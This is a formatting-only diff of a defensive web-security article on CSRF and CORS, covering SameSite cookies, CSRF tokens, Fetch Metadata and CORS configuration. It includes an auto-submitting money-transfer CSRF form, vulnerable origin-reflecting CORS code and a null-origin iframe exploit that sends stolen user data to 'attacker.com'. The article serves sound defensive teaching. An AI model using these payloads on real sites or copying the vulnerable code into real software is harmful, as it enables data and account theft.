@@ -48,13 +48,13 @@ CSRF and CORS address opposite sides of the same problem: managing cross-origin 
 
 **Key invariants**:
 
-| Defense | What It Protects | What It Does NOT Protect |
-|---------|------------------|--------------------------|
-| SameSite=Strict | All CSRF | Subdomains; if XSS exists, attacker is "same-site" |
-| SameSite=Lax | POST CSRF, unsafe methods | GET-based state changes; two-minute Lax+POST window |
-| CSRF Tokens | State-changing requests | Token extraction via XSS |
-| CORS | Response data confidentiality | Request being sent; cookies being attached |
-| Custom Headers | API endpoints | Simple requests (no preflight) |
+| Defense         | What It Protects              | What It Does NOT Protect                            |
+| --------------- | ----------------------------- | --------------------------------------------------- |
+| SameSite=Strict | All CSRF                      | Subdomains; if XSS exists, attacker is "same-site"  |
+| SameSite=Lax    | POST CSRF, unsafe methods     | GET-based state changes; two-minute Lax+POST window |
+| CSRF Tokens     | State-changing requests       | Token extraction via XSS                            |
+| CORS            | Response data confidentiality | Request being sent; cookies being attached          |
+| Custom Headers  | API endpoints                 | Simple requests (no preflight)                      |
 
 **Design principle**: Defense in depth. SameSite cookies are the first line; CSRF tokens cover edge cases; origin verification provides fallback; Fetch Metadata enables server-side filtering.
 
@@ -94,13 +94,13 @@ sequenceDiagram
 
 ### Attack Vectors
 
-| Vector | Method | Requires User Action |
-|--------|--------|---------------------|
-| `<img src="...">` | GET | None |
-| `<form method="POST">` auto-submit | POST | None (JavaScript) |
-| `<form>` with target `_blank` | POST | Click (or auto-submit) |
-| `fetch()` / `XMLHttpRequest` | Any | None (blocked by CORS for reads) |
-| `<link rel="prerender">` | GET | None |
+| Vector                             | Method | Requires User Action             |
+| ---------------------------------- | ------ | -------------------------------- |
+| `<img src="...">`                  | GET    | None                             |
+| `<form method="POST">` auto-submit | POST   | None (JavaScript)                |
+| `<form>` with target `_blank`      | POST   | Click (or auto-submit)           |
+| `fetch()` / `XMLHttpRequest`       | Any    | None (blocked by CORS for reads) |
+| `<link rel="prerender">`           | GET    | None                             |
 
 **Example**: Hidden form auto-submit
 
@@ -110,7 +110,9 @@ sequenceDiagram
   <input type="hidden" name="to" value="attacker-account" />
   <input type="hidden" name="amount" value="10000" />
 </form>
-<script>document.getElementById('evil').submit();</script>
+<script>
+  document.getElementById("evil").submit()
+</script>
 ```
 
 ### What CSRF Cannot Do
@@ -128,19 +130,21 @@ The `SameSite` attribute (RFC 6265bis, December 2025) controls when cookies are 
 
 **Specification** (draft-ietf-httpbis-rfc6265bis-22):
 
-| Mode | Behavior | Use Case |
-|------|----------|----------|
-| **Strict** | Cookie sent only in same-site context | Session cookies, auth tokens |
-| **Lax** | Sent with same-site + top-level navigations (safe methods) | Default; balances security/usability |
-| **None** | Sent in all contexts (requires `Secure`) | Third-party integrations, embeds |
+| Mode       | Behavior                                                   | Use Case                             |
+| ---------- | ---------------------------------------------------------- | ------------------------------------ |
+| **Strict** | Cookie sent only in same-site context                      | Session cookies, auth tokens         |
+| **Lax**    | Sent with same-site + top-level navigations (safe methods) | Default; balances security/usability |
+| **None**   | Sent in all contexts (requires `Secure`)                   | Third-party integrations, embeds     |
 
 **Same-site vs. cross-site determination**:
 
 A request is "same-site" when:
+
 1. The request is not a reload navigation triggered by user interaction, AND
 2. The request's current URL origin shares the same registrable domain as the client's "site for cookies"
 
 **Example**:
+
 - `app.example.com` → `api.example.com` = **same-site** (same registrable domain)
 - `app.example.com` → `api.other.com` = **cross-site**
 
@@ -169,10 +173,12 @@ Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly; Path=/
 Cookie prefixes (RFC 6265bis) enforce security properties through naming conventions that browsers validate.
 
 **`__Secure-` prefix**:
+
 - Cookie must have `Secure` attribute
 - Cannot be set from non-HTTPS origins
 
 **`__Host-` prefix** (strictest):
+
 - Must have `Secure` attribute
 - Must NOT have `Domain` attribute (locked to exact origin)
 - Must have `Path=/`
@@ -208,11 +214,11 @@ CSRF tokens provide request-level authentication beyond ambient cookies. The ser
 **Design rationale**: Attackers cannot read tokens from cross-origin pages (blocked by SOP). Even if they trigger a request, they cannot include the correct token value.
 
 ```javascript collapse={1-3, 22-30}
-import crypto from 'crypto'
+import crypto from "crypto"
 
 class SynchronizerTokenManager {
   generateToken(session) {
-    const token = crypto.randomBytes(32).toString('hex')
+    const token = crypto.randomBytes(32).toString("hex")
     session.csrfToken = token
     return token
   }
@@ -222,17 +228,14 @@ class SynchronizerTokenManager {
       return false
     }
     // Constant-time comparison prevents timing attacks
-    return crypto.timingSafeEqual(
-      Buffer.from(session.csrfToken),
-      Buffer.from(submittedToken)
-    )
+    return crypto.timingSafeEqual(Buffer.from(session.csrfToken), Buffer.from(submittedToken))
   }
 }
 
 // Express middleware
 app.use((req, res, next) => {
   if (!req.session.csrfToken) {
-    req.session.csrfToken = crypto.randomBytes(32).toString('hex')
+    req.session.csrfToken = crypto.randomBytes(32).toString("hex")
   }
   res.locals.csrfToken = req.session.csrfToken
   next()
@@ -241,11 +244,11 @@ app.use((req, res, next) => {
 
 **Trade-offs**:
 
-| Advantage | Disadvantage |
-|-----------|--------------|
-| Strong security | Requires server-side session storage |
-| Simple to understand | Doesn't work with stateless architectures |
-| Framework support widespread | Session storage scaling challenges |
+| Advantage                    | Disadvantage                              |
+| ---------------------------- | ----------------------------------------- |
+| Strong security              | Requires server-side session storage      |
+| Simple to understand         | Doesn't work with stateless architectures |
+| Framework support widespread | Session storage scaling challenges        |
 
 ### Signed Double-Submit Cookie Pattern (Stateless)
 
@@ -260,7 +263,7 @@ Token = HMAC(sessionId + randomValue, secretKey) + "." + randomValue
 **Why signing is required**: Without signing, attackers who can set cookies (via subdomain or other injection) could set both the cookie and body value to match. Signing binds the token to server-side secrets.
 
 ```javascript collapse={1-3, 28-45}
-import crypto from 'crypto'
+import crypto from "crypto"
 
 class SignedDoubleSubmitCSRF {
   constructor(secretKey) {
@@ -268,39 +271,35 @@ class SignedDoubleSubmitCSRF {
   }
 
   generateToken(sessionId) {
-    const randomValue = crypto.randomBytes(16).toString('hex')
+    const randomValue = crypto.randomBytes(16).toString("hex")
     const hmac = crypto
-      .createHmac('sha256', this.secretKey)
+      .createHmac("sha256", this.secretKey)
       .update(sessionId + randomValue)
-      .digest('hex')
+      .digest("hex")
     return `${hmac}.${randomValue}`
   }
 
   verifyToken(sessionId, token) {
-    if (!token || !token.includes('.')) return false
+    if (!token || !token.includes(".")) return false
 
-    const [submittedHmac, randomValue] = token.split('.')
+    const [submittedHmac, randomValue] = token.split(".")
     const expectedHmac = crypto
-      .createHmac('sha256', this.secretKey)
+      .createHmac("sha256", this.secretKey)
       .update(sessionId + randomValue)
-      .digest('hex')
+      .digest("hex")
 
-    return crypto.timingSafeEqual(
-      Buffer.from(submittedHmac),
-      Buffer.from(expectedHmac)
-    )
+    return crypto.timingSafeEqual(Buffer.from(submittedHmac), Buffer.from(expectedHmac))
   }
 }
 
 // Cookie: __Host-csrf=<token>; Secure; HttpOnly; SameSite=Strict
 // Header/Body: X-CSRF-Token: <same token>
-app.post('/api/transfer', (req, res) => {
-  const cookieToken = req.cookies['__Host-csrf']
-  const headerToken = req.headers['x-csrf-token']
+app.post("/api/transfer", (req, res) => {
+  const cookieToken = req.cookies["__Host-csrf"]
+  const headerToken = req.headers["x-csrf-token"]
 
-  if (!csrf.verifyToken(req.session.id, headerToken) ||
-      cookieToken !== headerToken) {
-    return res.status(403).json({ error: 'CSRF validation failed' })
+  if (!csrf.verifyToken(req.session.id, headerToken) || cookieToken !== headerToken) {
+    return res.status(403).json({ error: "CSRF validation failed" })
   }
   // Process request
 })
@@ -317,26 +316,26 @@ app.post('/api/transfer', (req, res) => {
 ```javascript collapse={1-2, 15-25}
 // Server-side middleware
 function requireCustomHeader(req, res, next) {
-  const csrfHeader = req.headers['x-requested-with']
+  const csrfHeader = req.headers["x-requested-with"]
 
   // Only applies to state-changing methods
-  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
-    if (csrfHeader !== 'XMLHttpRequest') {
-      return res.status(403).json({ error: 'Missing CSRF header' })
+  if (["POST", "PUT", "DELETE", "PATCH"].includes(req.method)) {
+    if (csrfHeader !== "XMLHttpRequest") {
+      return res.status(403).json({ error: "Missing CSRF header" })
     }
   }
   next()
 }
 
 // Client-side (automatically triggers preflight)
-fetch('/api/transfer', {
-  method: 'POST',
+fetch("/api/transfer", {
+  method: "POST",
   headers: {
-    'Content-Type': 'application/json',
-    'X-Requested-With': 'XMLHttpRequest', // Triggers CORS preflight
+    "Content-Type": "application/json",
+    "X-Requested-With": "XMLHttpRequest", // Triggers CORS preflight
   },
-  credentials: 'include',
-  body: JSON.stringify({ amount: 100 })
+  credentials: "include",
+  body: JSON.stringify({ amount: 100 }),
 })
 ```
 
@@ -344,11 +343,11 @@ fetch('/api/transfer', {
 
 **Framework header conventions**:
 
-| Framework | Header Name |
-|-----------|-------------|
+| Framework              | Header Name    |
+| ---------------------- | -------------- |
 | Rails, Laravel, Django | `X-CSRF-Token` |
-| AngularJS | `X-XSRF-Token` |
-| Express (csurf) | `CSRF-Token` |
+| AngularJS              | `X-XSRF-Token` |
+| Express (csurf)        | `CSRF-Token`   |
 
 ### Origin/Referer Verification
 
@@ -356,21 +355,18 @@ fetch('/api/transfer', {
 
 **Header availability**:
 
-| Header | When Sent | Reliability |
-|--------|-----------|-------------|
-| `Origin` | CORS requests, POST, form submissions | ~99% |
-| `Referer` | Most requests (can be stripped by policy) | ~98% |
-| Both absent | Privacy browsers, Referrer-Policy: no-referrer | ~1-2% |
+| Header      | When Sent                                      | Reliability |
+| ----------- | ---------------------------------------------- | ----------- |
+| `Origin`    | CORS requests, POST, form submissions          | ~99%        |
+| `Referer`   | Most requests (can be stripped by policy)      | ~98%        |
+| Both absent | Privacy browsers, Referrer-Policy: no-referrer | ~1-2%       |
 
 ```javascript collapse={1-6, 28-35}
-const ALLOWED_ORIGINS = new Set([
-  'https://app.example.com',
-  'https://www.example.com',
-])
+const ALLOWED_ORIGINS = new Set(["https://app.example.com", "https://www.example.com"])
 
 function verifyOrigin(req, res, next) {
-  const origin = req.headers['origin']
-  const referer = req.headers['referer']
+  const origin = req.headers["origin"]
+  const referer = req.headers["referer"]
 
   // Extract origin from referer if origin is absent
   let sourceOrigin = origin
@@ -383,7 +379,7 @@ function verifyOrigin(req, res, next) {
   }
 
   if (sourceOrigin && !ALLOWED_ORIGINS.has(sourceOrigin)) {
-    return res.status(403).json({ error: 'Invalid origin' })
+    return res.status(403).json({ error: "Invalid origin" })
   }
 
   // If both absent, fall back to other protections (tokens)
@@ -401,32 +397,32 @@ Fetch Metadata headers (W3C Working Draft, April 2025) allow servers to distingu
 
 **Sec-Fetch-Site**:
 
-| Value | Meaning |
-|-------|---------|
-| `same-origin` | Request from same origin |
-| `same-site` | Request from same registrable domain |
-| `cross-site` | Request from different site |
-| `none` | User-initiated (address bar, bookmark) |
+| Value         | Meaning                                |
+| ------------- | -------------------------------------- |
+| `same-origin` | Request from same origin               |
+| `same-site`   | Request from same registrable domain   |
+| `cross-site`  | Request from different site            |
+| `none`        | User-initiated (address bar, bookmark) |
 
 **Sec-Fetch-Mode**:
 
-| Value | Meaning |
-|-------|---------|
-| `navigate` | Top-level navigation |
-| `cors` | CORS request |
-| `no-cors` | Simple cross-origin request |
-| `same-origin` | Same-origin request |
-| `websocket` | WebSocket connection |
+| Value         | Meaning                     |
+| ------------- | --------------------------- |
+| `navigate`    | Top-level navigation        |
+| `cors`        | CORS request                |
+| `no-cors`     | Simple cross-origin request |
+| `same-origin` | Same-origin request         |
+| `websocket`   | WebSocket connection        |
 
 **Sec-Fetch-Dest**:
 
-| Value | Examples |
-|-------|----------|
+| Value      | Examples             |
+| ---------- | -------------------- |
 | `document` | Top-level navigation |
-| `iframe` | Iframe embed |
-| `script` | Script loading |
-| `image` | Image loading |
-| `empty` | fetch(), XHR |
+| `iframe`   | Iframe embed         |
+| `script`   | Script loading       |
+| `image`    | Image loading        |
+| `empty`    | fetch(), XHR         |
 
 **Sec-Fetch-User**: `?1` when user-activated (click, keyboard); omitted otherwise.
 
@@ -434,35 +430,35 @@ Fetch Metadata headers (W3C Working Draft, April 2025) allow servers to distingu
 
 ```javascript collapse={1-8, 35-45}
 function fetchMetadataPolicy(req, res, next) {
-  const site = req.headers['sec-fetch-site']
-  const mode = req.headers['sec-fetch-mode']
-  const dest = req.headers['sec-fetch-dest']
+  const site = req.headers["sec-fetch-site"]
+  const mode = req.headers["sec-fetch-mode"]
+  const dest = req.headers["sec-fetch-dest"]
 
   // Allow same-origin requests
-  if (site === 'same-origin') {
+  if (site === "same-origin") {
     return next()
   }
 
   // Allow user-initiated navigations
-  if (site === 'none') {
+  if (site === "none") {
     return next()
   }
 
   // Allow same-site requests from subdomains
-  if (site === 'same-site' && mode === 'navigate') {
+  if (site === "same-site" && mode === "navigate") {
     return next()
   }
 
   // Block cross-site requests to sensitive endpoints
-  if (site === 'cross-site') {
+  if (site === "cross-site") {
     // Only allow specific cross-site patterns
-    if (dest === 'image' || dest === 'script') {
+    if (dest === "image" || dest === "script") {
       // Public assets only
-      if (req.path.startsWith('/public/')) {
+      if (req.path.startsWith("/public/")) {
         return next()
       }
     }
-    return res.status(403).json({ error: 'Cross-site request blocked' })
+    return res.status(403).json({ error: "Cross-site request blocked" })
   }
 
   next()
@@ -480,16 +476,19 @@ Cross-Origin Resource Sharing (CORS) is a browser mechanism allowing servers to 
 ### The Same-Origin Policy
 
 The Same-Origin Policy (SOP) is the browser's default security boundary. Two URLs have the same origin if they share:
+
 - **Scheme**: `https:` vs `http:`
 - **Host**: `api.example.com` vs `example.com`
 - **Port**: `:443` vs `:8080`
 
 **What SOP blocks**:
+
 - JavaScript reading cross-origin responses
 - Accessing cross-origin DOM
 - Reading cross-origin cookies
 
 **What SOP does NOT block**:
+
 - Sending cross-origin requests
 - Embedding cross-origin resources (`<img>`, `<script>`, `<iframe>`)
 - Form submissions to cross-origin targets
@@ -529,14 +528,14 @@ Vary: Origin
 
 ### CORS Response Headers
 
-| Header | Purpose | Required When |
-|--------|---------|---------------|
-| `Access-Control-Allow-Origin` | Origin(s) permitted to read response | Always for CORS |
-| `Access-Control-Allow-Methods` | Methods permitted beyond simple | Preflight only |
-| `Access-Control-Allow-Headers` | Non-simple headers permitted | Preflight only |
-| `Access-Control-Allow-Credentials` | Credentials (cookies) allowed | With `credentials: 'include'` |
-| `Access-Control-Expose-Headers` | Headers JavaScript can read | Optional |
-| `Access-Control-Max-Age` | Preflight cache duration (seconds) | Optional |
+| Header                             | Purpose                              | Required When                 |
+| ---------------------------------- | ------------------------------------ | ----------------------------- |
+| `Access-Control-Allow-Origin`      | Origin(s) permitted to read response | Always for CORS               |
+| `Access-Control-Allow-Methods`     | Methods permitted beyond simple      | Preflight only                |
+| `Access-Control-Allow-Headers`     | Non-simple headers permitted         | Preflight only                |
+| `Access-Control-Allow-Credentials` | Credentials (cookies) allowed        | With `credentials: 'include'` |
+| `Access-Control-Expose-Headers`    | Headers JavaScript can read          | Optional                      |
+| `Access-Control-Max-Age`           | Preflight cache duration (seconds)   | Optional                      |
 
 ### Credentialed Requests and Wildcards
 
@@ -563,11 +562,11 @@ Vary: Origin
 
 **Browser limits**:
 
-| Browser | Maximum Max-Age |
-|---------|-----------------|
-| Chrome | 7200 seconds (2 hours) |
+| Browser | Maximum Max-Age          |
+| ------- | ------------------------ |
+| Chrome  | 7200 seconds (2 hours)   |
 | Firefox | 86400 seconds (24 hours) |
-| Safari | 600 seconds (10 minutes) |
+| Safari  | 600 seconds (10 minutes) |
 
 **Cache key**: Origin + URL + credentials mode. A cached preflight for `credentials: 'omit'` doesn't apply to `credentials: 'include'`.
 
@@ -582,8 +581,8 @@ CORS misconfigurations can effectively disable SOP protections for your endpoint
 ```javascript
 // VULNERABLE
 app.use((req, res, next) => {
-  res.setHeader('Access-Control-Allow-Origin', req.headers.origin)
-  res.setHeader('Access-Control-Allow-Credentials', 'true')
+  res.setHeader("Access-Control-Allow-Origin", req.headers.origin)
+  res.setHeader("Access-Control-Allow-Credentials", "true")
   next()
 })
 ```
@@ -593,17 +592,14 @@ app.use((req, res, next) => {
 **Fix**: Validate against an allowlist:
 
 ```javascript collapse={1-5, 18-25}
-const ALLOWED_ORIGINS = new Set([
-  'https://app.example.com',
-  'https://staging.example.com',
-])
+const ALLOWED_ORIGINS = new Set(["https://app.example.com", "https://staging.example.com"])
 
 app.use((req, res, next) => {
   const origin = req.headers.origin
   if (origin && ALLOWED_ORIGINS.has(origin)) {
-    res.setHeader('Access-Control-Allow-Origin', origin)
-    res.setHeader('Access-Control-Allow-Credentials', 'true')
-    res.setHeader('Vary', 'Origin')
+    res.setHeader("Access-Control-Allow-Origin", origin)
+    res.setHeader("Access-Control-Allow-Credentials", "true")
+    res.setHeader("Vary", "Origin")
   }
   next()
 })
@@ -619,6 +615,7 @@ Access-Control-Allow-Credentials: true
 ```
 
 **When browsers send `Origin: null`**:
+
 - Sandboxed iframes (`sandbox="allow-scripts"`)
 - Local file access (`file://` URLs)
 - Data URIs
@@ -627,7 +624,8 @@ Access-Control-Allow-Credentials: true
 **Exploit** (CVE-2019-9580 pattern):
 
 ```html
-<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
+<iframe
+  sandbox="allow-scripts allow-top-navigation allow-forms"
   src="data:text/html,<script>
     fetch('https://api.vulnerable.com/user/data', {credentials:'include'})
       .then(r => r.json())
@@ -635,7 +633,8 @@ Access-Control-Allow-Credentials: true
         // Exfiltrate data
         navigator.sendBeacon('https://attacker.com/collect', JSON.stringify(data))
       })
-  </script>">
+  </script>"
+>
 </iframe>
 ```
 
@@ -649,7 +648,7 @@ Access-Control-Allow-Credentials: true
 // VULNERABLE - doesn't anchor end
 const allowedPattern = /^https:\/\/.*\.example\.com/
 if (allowedPattern.test(origin)) {
-  res.setHeader('Access-Control-Allow-Origin', origin)
+  res.setHeader("Access-Control-Allow-Origin", origin)
 }
 // Bypass: https://example.com.attacker.com
 ```
@@ -658,7 +657,7 @@ if (allowedPattern.test(origin)) {
 
 ```javascript
 // SECURE - exact match
-const ALLOWED_ORIGINS = new Set(['https://app.example.com'])
+const ALLOWED_ORIGINS = new Set(["https://app.example.com"])
 
 // Or properly anchored regex
 const allowedPattern = /^https:\/\/[a-z]+\.example\.com$/
@@ -670,8 +669,8 @@ const allowedPattern = /^https:\/\/[a-z]+\.example\.com$/
 
 ```javascript
 // VULNERABLE if subdomains can be compromised
-if (origin.endsWith('.example.com')) {
-  res.setHeader('Access-Control-Allow-Origin', origin)
+if (origin.endsWith(".example.com")) {
+  res.setHeader("Access-Control-Allow-Origin", origin)
 }
 ```
 
@@ -687,13 +686,13 @@ if (origin.endsWith('.example.com')) {
 Set-Cookie: __Host-session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
 ```
 
-| Attribute | Purpose | Requirement |
-|-----------|---------|-------------|
-| `__Host-` prefix | Prevents subdomain injection | Requires Secure, Path=/, no Domain |
-| `Secure` | HTTPS only | Required for production |
-| `HttpOnly` | No JavaScript access | Required for session cookies |
-| `SameSite=Strict` | No cross-site requests | Primary CSRF defense |
-| `Path=/` | Applies to all paths | Recommended |
+| Attribute         | Purpose                      | Requirement                        |
+| ----------------- | ---------------------------- | ---------------------------------- |
+| `__Host-` prefix  | Prevents subdomain injection | Requires Secure, Path=/, no Domain |
+| `Secure`          | HTTPS only                   | Required for production            |
+| `HttpOnly`        | No JavaScript access         | Required for session cookies       |
+| `SameSite=Strict` | No cross-site requests       | Primary CSRF defense               |
+| `Path=/`          | Applies to all paths         | Recommended                        |
 
 ### CSRF Defense Layers
 
@@ -718,10 +717,7 @@ Set-Cookie: __Host-session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
 ```javascript collapse={1-10, 35-50}
 const corsOptions = {
   origin: (origin, callback) => {
-    const ALLOWED = new Set([
-      'https://app.example.com',
-      'https://admin.example.com',
-    ])
+    const ALLOWED = new Set(["https://app.example.com", "https://admin.example.com"])
 
     // Allow requests with no origin (same-origin, curl, etc.)
     if (!origin) return callback(null, true)
@@ -729,11 +725,11 @@ const corsOptions = {
     if (ALLOWED.has(origin)) {
       callback(null, true)
     } else {
-      callback(new Error('CORS not allowed'))
+      callback(new Error("CORS not allowed"))
     }
   },
-  methods: ['GET', 'POST', 'PUT', 'DELETE'],
-  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
+  methods: ["GET", "POST", "PUT", "DELETE"],
+  allowedHeaders: ["Content-Type", "Authorization", "X-CSRF-Token"],
   credentials: true,
   maxAge: 86400, // 24 hours (browser may cap lower)
   optionsSuccessStatus: 204,
@@ -743,7 +739,7 @@ app.use(cors(corsOptions))
 
 // Explicit Vary header for caching
 app.use((req, res, next) => {
-  res.setHeader('Vary', 'Origin')
+  res.setHeader("Vary", "Origin")
   next()
 })
 ```
@@ -800,17 +796,17 @@ Log CSRF and CORS failures for security monitoring:
 ```javascript collapse={1-5, 20-30}
 function securityEventLogger(req, res, next) {
   const originalEnd = res.end
-  res.end = function(...args) {
+  res.end = function (...args) {
     if (res.statusCode === 403) {
-      logger.warn('Security block', {
+      logger.warn("Security block", {
         type: res.locals.securityBlockReason,
         ip: req.ip,
         origin: req.headers.origin,
         referer: req.headers.referer,
         path: req.path,
         method: req.method,
-        userAgent: req.headers['user-agent'],
-        fetchSite: req.headers['sec-fetch-site'],
+        userAgent: req.headers["user-agent"],
+        fetchSite: req.headers["sec-fetch-site"],
       })
     }
     originalEnd.apply(this, args)
@@ -820,6 +816,7 @@ function securityEventLogger(req, res, next) {
 ```
 
 **Alerting thresholds**:
+
 - Spike in CSRF token failures: Possible attack or token expiration issue
 - Repeated null origin attempts: Possible exploitation attempt
 - Origin validation failures from same IP: Targeted attack
@@ -853,14 +850,14 @@ CSRF and CORS defense requires understanding that browsers automatically include
 
 ### Terminology
 
-| Term | Definition |
-|------|------------|
-| **CORS** | Cross-Origin Resource Sharing—browser mechanism for controlled SOP relaxation |
-| **CSRF** | Cross-Site Request Forgery—attack exploiting automatic cookie inclusion |
-| **Fetch Metadata** | Sec-Fetch-* headers providing request context to servers |
-| **Preflight** | OPTIONS request checking if server permits a cross-origin request |
-| **SameSite** | Cookie attribute controlling cross-site request inclusion |
-| **SOP** | Same-Origin Policy—browser default blocking cross-origin resource access |
+| Term               | Definition                                                                    |
+| ------------------ | ----------------------------------------------------------------------------- |
+| **CORS**           | Cross-Origin Resource Sharing—browser mechanism for controlled SOP relaxation |
+| **CSRF**           | Cross-Site Request Forgery—attack exploiting automatic cookie inclusion       |
+| **Fetch Metadata** | Sec-Fetch-\* headers providing request context to servers                     |
+| **Preflight**      | OPTIONS request checking if server permits a cross-origin request             |
+| **SameSite**       | Cookie attribute controlling cross-site request inclusion                     |
+| **SOP**            | Same-Origin Policy—browser default blocking cross-origin resource access      |
 
 ### Summary
 
@@ -878,7 +875,7 @@ CSRF and CORS defense requires understanding that browsers automatically include
 
 - [RFC 6265bis - Cookies: HTTP State Management Mechanism](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis) - SameSite cookie specification (December 2025)
 - [WHATWG Fetch Standard](https://fetch.spec.whatwg.org/) - CORS protocol specification
-- [W3C Fetch Metadata Request Headers](https://w3c.github.io/webappsec-fetch-metadata/) - Sec-Fetch-* headers (Working Draft, April 2025)
+- [W3C Fetch Metadata Request Headers](https://w3c.github.io/webappsec-fetch-metadata/) - Sec-Fetch-\* headers (Working Draft, April 2025)
 
 **Official Documentation**
 
